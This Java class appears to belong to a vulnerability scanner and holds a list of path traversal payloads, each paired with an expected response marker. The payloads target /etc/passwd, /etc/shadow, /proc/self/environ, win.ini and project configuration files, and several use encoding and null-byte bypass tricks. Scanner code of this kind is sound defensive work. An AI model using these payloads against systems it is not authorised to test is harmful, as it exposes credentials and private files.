package com.network.monitor.util.payload;

import java.util.ArrayList;
import java.util.List;

public final class PathTraversalPayload {

    private PathTraversalPayload() {
    }

    public static List<PayloadCase> getPayloads(String scanType) {
        List<PayloadCase> payloads = new ArrayList<>();
        
        payloads.add(new PayloadCase("../../application.yml", "server:", "读取服务配置文件"));
        
        if ("FULL".equalsIgnoreCase(scanType)) {
            payloads.add(new PayloadCase("../../../../../pom.xml", "<project", "读取项目构建文件"));
            payloads.add(new PayloadCase("....//....//....//etc/passwd", "root:", "Linux 密码文件读取"));
            payloads.add(new PayloadCase("..\\..\\..\\..\\windows\\win.ini", "[fonts]", "Windows 系统文件读取"));
            payloads.add(new PayloadCase("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd", "root:", "URL编码绕过"));
            payloads.add(new PayloadCase("....//....//....//etc/shadow", "root:", "Linux 影子文件读取"));
            payloads.add(new PayloadCase("..%252f..%252f..%252fetc/passwd", "root:", "双重URL编码绕过"));
            payloads.add(new PayloadCase("/etc/passwd%00", "root:", "Null字节截断"));
            payloads.add(new PayloadCase("....//....//....//proc/self/environ", "PATH", "环境变量读取"));
        }
        
        return payloads;
    }
}
